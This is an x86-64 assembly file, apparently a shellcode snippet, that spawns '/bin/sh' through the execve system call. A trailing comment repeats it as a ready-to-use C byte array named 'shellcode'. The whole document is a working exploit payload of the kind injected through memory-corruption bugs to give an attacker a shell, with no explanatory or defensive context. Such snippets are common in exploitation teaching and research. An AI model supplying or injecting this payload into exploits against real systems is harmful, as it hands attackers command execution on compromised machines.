
.text
 
.globl _start
_start:
 	# /bin/sh
	xor             %rax, %rax
	movq            $0x68732f2f6e69622f, %rbx
	pushq           %rax
	pushq           %rbx
	movq            %rsp, %rdi
	movb            $59, %al
	xor             %rsi, %rsi
	xor             %rdx, %rdx
	syscall

/*
 * static const char shellcode[] = "\x48\x31\xc0\x48\xbb\x2f\x62\x69"
 *                                 "\x6e\x2f\x2f\x73\x68\x50\x53\x48"
 *                                 "\x89\xe7\xb0\x3b\x48\x31\xf6\x48"
 *                                 "\x31\xd2\x0f\x05";
 */